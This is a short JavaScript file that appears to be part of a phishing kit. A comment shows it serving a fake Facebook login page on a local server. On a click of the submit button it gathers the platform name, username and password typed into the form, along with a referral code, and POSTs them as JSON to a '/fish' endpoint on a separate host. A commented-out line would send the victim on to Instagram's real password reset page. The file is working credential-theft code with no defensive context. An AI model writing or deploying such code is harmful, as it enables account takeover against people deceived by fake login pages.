
const params = new URLSearchParams(window.location.search);
const uId = params.get("ref"); //http://192.168.1.4:5500/d/facebook.com/login.html?ref=avemariadoido

let codeRef = uId


document.addEventListener("click", async (e) => {
    if (e.target.classList[0] === "enviar" || e.target.classList[2] === "enviar") {
    
        let dados = {
            platform: document.querySelector(".platform").value,
            user: document.querySelector(".inputName").value,
            pass: document.querySelector(".inputPass").value,
            codRef: codeRef
        };
        enviarDados(dados)

       // location.href = "https://www.instagram.com/accounts/password/reset/"
       
    }
});

async function enviarDados(dados){
await fetch(host+"/fish", {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(dados),
})
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then(data => console.log('Success:', data))
  .catch(error => console.error('Error:', error));
}
